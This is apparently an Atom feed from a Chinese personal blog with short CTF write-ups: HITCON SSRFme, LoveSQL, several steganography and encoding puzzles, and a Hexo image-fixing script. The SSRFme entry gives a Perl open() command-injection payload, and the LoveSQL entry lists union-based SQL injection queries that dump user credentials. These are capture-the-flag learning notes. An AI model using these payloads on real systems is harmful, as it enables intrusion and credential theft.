<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Da4er&#39;s Blogs</title>
  
  <subtitle>学而专，专而精。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://da4er.top/"/>
  <updated>2020-02-07T15:27:59.478Z</updated>
  <id>https://da4er.top/</id>
  
  <author>
    <name>Da4er&#39;s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2.7 [SUCTF 2019]Game</title>
    <link href="https://da4er.top/2-7-SUCTF-2019-Game.html"/>
    <id>https://da4er.top/2-7-SUCTF-2019-Game.html</id>
    <published>2020-02-07T15:25:55.000Z</published>
    <updated>2020-02-07T15:27:59.478Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>查看源代码找到一串base32，解码得：suctf{hAHaha_Fak3_F1ag}，显然是个假的flag。</strong><br><img src="/2-7-SUCTF-2019-Game/1.png" class title="This is an test image"><br><strong>接着在图片中寻找，找到一个des加密的字符串：U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</strong><br><img src="/2-7-SUCTF-2019-Game/2.png" class title="This is an test image"><br>DES加密的字符串都是以<strong>U2FsdGVkX1</strong>开头的。<br>用在线网站解码des，使用3DES解码：密码为假的flag<br><img src="/2-7-SUCTF-2019-Game/3.png" class title="This is an test image"><br>得到flag：flag{U_F0und_1t}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;查看源代码找到一串base32，解码得：suctf{hAHaha_Fak3_F1ag}，显然是个假的flag。&lt;/strong&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [HITCON 2017]SSRFme</title>
    <link href="https://da4er.top/2-7-HITCON-2017-SSRFme.html"/>
    <id>https://da4er.top/2-7-HITCON-2017-SSRFme.html</id>
    <published>2020-02-07T14:58:11.000Z</published>
    <updated>2020-02-07T14:59:08.064Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>首先拿到源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);</span><br><span class="line">        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><br>主要代码是这个部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br></pre></td></tr></table></figure><br><strong>代码逻辑为：1.创建一个’orange/客户端ip哈希值’的目录；2.将传入的URL带入命令GET执行 — GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求；3.解析filename参数，传入filename的最后一级文件夹（获取不为空）并创建。</strong><br><img src="/2-7-HITCON-2017-SSRFme/1.png" class title="This is an test image"></p><hr><p><strong>解法有很多，但是我在做的时候主要用的open()函数绕过检测机制的方法。</strong><br><strong>首先通过上面代码的逻辑访问网站根目录：<br>创建一个名为a的文件，通过url参数访问根目录，那么访问的信息就会存储在a文件下。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&amp;filename&#x3D;a</span><br><span class="line">sandbox&#x2F;0a3519231615f5dcb5681b439c71d89c&#x2F;a</span><br></pre></td></tr></table></figure><br><img src="/2-7-HITCON-2017-SSRFme/2.png" class title="This is an test image"><br>看到有个readflag。<br>其次用到了perl语言的open函数参数是可控的，可以执行任意命令。<br><strong>这里要明确一点perl的GET命令是调用open函数来实现执行命令的。</strong><br>下面是截取别的大佬博客wp中的一段：<br><img src="/2-7-HITCON-2017-SSRFme/3.png" class title="This is an test image"><br><strong>这个意思有两点：1.在file.pm中open函数参数可控；2.file.pm先判断(file:文件名)中的文件是否存在，才能执行文件名对应的命令。</strong><br>所以最终的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;bash -c &#x2F;readflag|  创建相应的同名文件。</span><br><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;da4er   利用open执行代码。</span><br><span class="line">最后直接访问&#x2F; sandbox &#x2F;哈希值&#x2F; 123就能得到flag。</span><br></pre></td></tr></table></figure><br><img src="/2-7-HITCON-2017-SSRFme/4.png" class title="This is an test image">)</p><hr><p>参考博客：<br><a href="https://www.jianshu.com/p/3f82685f56a8" target="_blank" rel="noopener">1</a><br><a href="http://momomoxiaoxi.com/2017/11/08/HITCON/" target="_blank" rel="noopener">2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;首先拿到源码：&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [极客大挑战 2019]Knife&amp;LoveSQL&amp;Http</title>
    <link href="https://da4er.top/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http.html"/>
    <id>https://da4er.top/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http.html</id>
    <published>2020-02-07T14:27:03.000Z</published>
    <updated>2020-02-07T14:28:22.098Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p><strong>题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/1.png" class title="This is an test image"></p><hr><h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p><strong>简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。</strong><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1 --+</span><br><span class="line">and 1&#x3D;2 --+</span><br><span class="line">order by 3 --+</span><br><span class="line">union select 1,2,3 --+</span><br><span class="line">union select 1,database(),version() --+</span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br><span class="line">union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(&#39;:&#39;,username,password)) from users --+)</span><br></pre></td></tr></table></figure><br>将对应的表名换成题目中的表名即可<br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/2.png" class title="This is an test image"></p><hr><h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p><strong>这道题目主要考察http头部信息的理解和利用。</strong><br><strong>首先查看源码找到Secret.php</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/3.png" class title="This is an test image"><br><strong>接下来就是https头部的构造了，如图构造了三个http头部信息：User-Agent；Referer；X-Forwared-For。</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/4.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id=&quot;Knife&quot;&gt;&lt;a href=&quot;#Knife&quot; class=&quot;headerlink&quot; title=&quot;Knife&quot;&gt;&lt;/a&gt;Kn
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>[GXYCTF2019]gakki</title>
    <link href="https://da4er.top/GXYCTF2019-gakki.html"/>
    <id>https://da4er.top/GXYCTF2019-gakki.html</id>
    <published>2020-02-07T13:03:42.000Z</published>
    <updated>2020-02-07T13:07:22.989Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>先binwalk分离图片的压缩包：</strong><br><img src="/GXYCTF2019-gakki/1.png" class title="This is an test image"><br><strong>得到的压缩包有密码，尝试爆破。</strong><br><img src="/GXYCTF2019-gakki/2.png" class title="This is an test image"><br><strong>看到flag.txt有很多字符，想到字符频率，用脚本或者HxD查看都可以。</strong><br><img src="/GXYCTF2019-gakki/3.png" class title="This is an test image"><br><img src="/GXYCTF2019-gakki/4.png" class title="This is an test image"><br>附上解题脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">def processLine(line, CharacterCounts):</span><br><span class="line">    for character in line:</span><br><span class="line">        #if ord(character) in range(97, 123):</span><br><span class="line">        if ord(character) in range(32,126):</span><br><span class="line">            CharacterCounts[character] +&#x3D; 1</span><br><span class="line">  </span><br><span class="line">#创建字母字典</span><br><span class="line">def createCharacterCounts(CharacterCounts):</span><br><span class="line">    #for i in range(97, 123):</span><br><span class="line">    for i in range(32, 126):</span><br><span class="line">        CharacterCounts[chr(i)] &#x3D; 0</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">    #用户输入一个文件名</span><br><span class="line">    # filename &#x3D; input(&quot;enter a filename:&quot;).strip()</span><br><span class="line">    filename &#x3D; &quot;flag.txt&quot;</span><br><span class="line">    infile &#x3D; open(filename, &quot;r&quot;)</span><br><span class="line">      </span><br><span class="line">    #建立用于计算词频的空字典</span><br><span class="line">    CharacterCounts &#x3D; &#123;&#125;</span><br><span class="line">    #初始化字典键值</span><br><span class="line">    createCharacterCounts(CharacterCounts)</span><br><span class="line">    for line in infile:</span><br><span class="line">        #processLine(line.lower(), CharacterCounts)</span><br><span class="line">        processLine(line, CharacterCounts)</span><br><span class="line">          </span><br><span class="line">    #从字典中获取数据对</span><br><span class="line">    pairs &#x3D; list(CharacterCounts.items())</span><br><span class="line">  </span><br><span class="line">    #列表中的数据对交换位置,数据对排序</span><br><span class="line">    items &#x3D; [[x,y] for (y,x) in pairs] </span><br><span class="line">    items.sort(reverse&#x3D;True)</span><br><span class="line">  </span><br><span class="line">    #输出count个数词频结果</span><br><span class="line">    for i in range(len(items)):</span><br><span class="line">        #print(items[i][1]+&quot;\t&quot;+str(items[i][0]))</span><br><span class="line">        print(items[i][1],end&#x3D;&#39;&#39;)</span><br><span class="line">          </span><br><span class="line">    infile.close()</span><br><span class="line">          </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;先binwalk分离图片的压缩包：&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/GXYCTF2019-gakki/1.png&quot;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [GXYCTF2019]Is this base?</title>
    <link href="https://da4er.top/2-7-GXYCTF2019-Is-this-base.html"/>
    <id>https://da4er.top/2-7-GXYCTF2019-Is-this-base.html</id>
    <published>2020-02-07T12:45:22.000Z</published>
    <updated>2020-02-07T12:56:11.886Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>首先打开题目发现有很多行base64，想到base64隐写。所谓的base64隐写就是通过在base64最后几个字节中隐藏信息，所以要使用很多行来存储信息。看到有很多行base64首先要想到base64隐写！</strong></p><hr><img src="/2-7-GXYCTF2019-Is-this-base/1.png" class title="This is an test image"><p>使用脚本跑即可，附上脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">            rowb64 =  <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line">            offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">            equalnum = stegb64.count(<span class="string">'='</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">            <span class="keyword">if</span> equalnum:</span><br><span class="line">                bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)])</span><br></pre></td></tr></table></figure><br><strong>得到flag</strong><br><img src="/2-7-GXYCTF2019-Is-this-base/2.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;首先打开题目发现有很多行base64，想到base64隐写。所谓的base64隐写就是通过在base64最后几个字节中隐藏信息，
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>博客图片无法正常显示说明</title>
    <link href="https://da4er.top/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E8%AF%B4%E6%98%8E.html"/>
    <id>https://da4er.top/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E8%AF%B4%E6%98%8E.html</id>
    <published>2020-02-07T11:20:21.000Z</published>
    <updated>2020-02-07T12:31:22.395Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>这两天重新装了一下hexo博客，在处理上传图片时发现，用之前的markdown格式上传本地图片网页不在显示，通过百度知道可以使用如下语法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img test.jpg This is an test image %&#125;</span><br></pre></td></tr></table></figure><br><strong>所以我们将之前的上传的图片都改成这种格式，写个python脚本批量改即可。</strong><br>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_blog_image</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(text, <span class="string">'r+'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        r = fp.readlines()</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"new"</span>, <span class="string">"w+"</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> fp1:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">                <span class="keyword">if</span> (i.startswith(<span class="string">"!["</span>)):</span><br><span class="line">                    a = i.split(<span class="string">".png"</span>)</span><br><span class="line"><span class="comment">#只能更改博客10张图片</span></span><br><span class="line">                    num = a[<span class="number">0</span>][<span class="number">-1</span>:]</span><br><span class="line">                    <span class="comment"># print(num)</span></span><br><span class="line">                    b = <span class="string">"&#123;% asset_img "</span> + <span class="string">"&#123;0&#125;.png"</span>.format(num) + <span class="string">" This is an test image %&#125;"</span></span><br><span class="line">                    rep = i</span><br><span class="line">                    i = i.replace(rep, b)</span><br><span class="line">                    fp1.write(i + <span class="string">"\n"</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    fp1.write(i)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    text=input()</span><br><span class="line">    change_blog_image(text)</span><br><span class="line">    os.remove(text)</span><br><span class="line">    os.rename(<span class="string">'new'</span>,text)</span><br></pre></td></tr></table></figure><br><strong>说明一下：这个脚本只能改图片只有10张的博客(保存在本地的图片格式为：数字(1,2,3,4….).png)。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;这两天重新装了一下hexo博客，在处理上传图片时发现，用之前的markdown格式上传本地图片网页不在显示，通过百度知道可以使用
      
    
    </summary>
    
    
      <category term="随笔" scheme="https://da4er.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随便" scheme="https://da4er.top/tags/%E9%9A%8F%E4%BE%BF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [GXYCTF2019]佛系青年</title>
    <link href="https://da4er.top/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4.html"/>
    <id>https://da4er.top/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4.html</id>
    <published>2020-02-07T08:51:35.000Z</published>
    <updated>2020-02-07T09:22:49.870Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>下载压缩包解压有密码，binwalk分离出来两个压缩包。</strong><br><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/1.png" class title="This is an test image"><br><strong>会直接把fo.txt分离出来。</strong><br><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/2.png" class title="This is an test image"><br><strong>打开是’与佛论禅’密码，在线网站解密一下。</strong><br><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/3.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;下载压缩包解压有密码，binwalk分离出来两个压缩包。&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-7-GXYCTF20
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.6 buuctf_misc_从娃娃抓起</title>
    <link href="https://da4er.top/2-6-buuctf-misc-%E4%BB%8E%E5%A8%83%E5%A8%83%E6%8A%93%E8%B5%B7.html"/>
    <id>https://da4er.top/2-6-buuctf-misc-%E4%BB%8E%E5%A8%83%E5%A8%83%E6%8A%93%E8%B5%B7.html</id>
    <published>2020-02-06T04:37:40.000Z</published>
    <updated>2020-02-07T07:51:57.592Z</updated>
    
    <content type="html"><![CDATA[<p><strong>根据题目提示：</strong><br><img src data-echo="2-6-buuctf-misc-从娃娃抓起/2.png" alt="2-6-buuctf-misc-从娃娃抓起"><br>编码是两个汉字编码，试了好多编码形式，找到了两个：中文电码和五笔编码。<br><img src data-echo="2-6-buuctf-misc-从娃娃抓起/3.png" alt="2-6-buuctf-misc-从娃娃抓起"><br><a href="https://dianma.51240.com/" target="_blank" rel="noopener">中文电码在线解码</a><br><strong>五笔编码现在还没有找到好的网站去解，只能一个一个对照emmmmmm</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;根据题目提示：&lt;/strong&gt;&lt;br&gt;&lt;img src data-echo=&quot;2-6-buuctf-misc-从娃娃抓起/2.png&quot; alt=&quot;2-6-buuctf-misc-从娃娃抓起&quot;&gt;&lt;br&gt;编码是两个汉字编码，试了好多编码形式，找到了两个：中文电
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.6 [SWPU2019]Network</title>
    <link href="https://da4er.top/2-6-SWPU2019-Network.html"/>
    <id>https://da4er.top/2-6-SWPU2019-Network.html</id>
    <published>2020-02-06T03:52:51.000Z</published>
    <updated>2020-02-07T12:10:11.126Z</updated>
    
    <content type="html"><![CDATA[<p><strong>题目是一个txt文件，里面只有4个数字：63，127，191，255。虽然题目提示network，但是看了wp知道是ttl隐写。</strong></p><hr><p><strong>将每个数字转化成8位二进制</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">63 00111111 </span><br><span class="line">127 01111111 </span><br><span class="line">191 10111111 </span><br><span class="line">255 11111111</span><br></pre></td></tr></table></figure><br>每一个 TTL 只有前两位隐藏数据，每四个为一组，隐藏一个字节。<br>附上脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">with open(&#39;attachment.txt&#39;,&#39;r&#39;) as fp:</span><br><span class="line">    a&#x3D;fp.readlines()</span><br><span class="line">    p&#x3D;[]</span><br><span class="line">    for x in range(len(a)):</span><br><span class="line">       p.append(int(a[x])) </span><br><span class="line">    s&#x3D;&#39;&#39;</span><br><span class="line">    for i in p:</span><br><span class="line">        if(i&#x3D;&#x3D;63):</span><br><span class="line">            b&#x3D;&#39;00&#39;</span><br><span class="line">        elif(i&#x3D;&#x3D;127):</span><br><span class="line">            b&#x3D;&#39;01&#39;</span><br><span class="line">        elif(i&#x3D;&#x3D;191):</span><br><span class="line">            b&#x3D;&#39;10&#39;</span><br><span class="line">        else:</span><br><span class="line">            b&#x3D;&#39;11&#39;</span><br><span class="line">        s +&#x3D;b</span><br><span class="line"># print(s)</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,len(s),8):</span><br><span class="line">    flag +&#x3D; chr(int(s[i:i+8],2))</span><br><span class="line">flag &#x3D; binascii.unhexlify(flag)</span><br><span class="line">wp &#x3D; open(&#39;ans.zip&#39;,&#39;wb&#39;)</span><br><span class="line">wp.write(flag)</span><br><span class="line">wp.close()</span><br></pre></td></tr></table></figure><br><strong>转换成一个压缩包，有密码是伪加密，修改完得到flag。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;题目是一个txt文件，里面只有4个数字：63，127，191，255。虽然题目提示network，但是看了wp知道是ttl隐写。&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;将每个数字转化成8位二进制&lt;/strong&gt;&lt;br&gt;&lt;figure c
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.6 [极客大挑战 2019]PHP</title>
    <link href="https://da4er.top/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP.html"/>
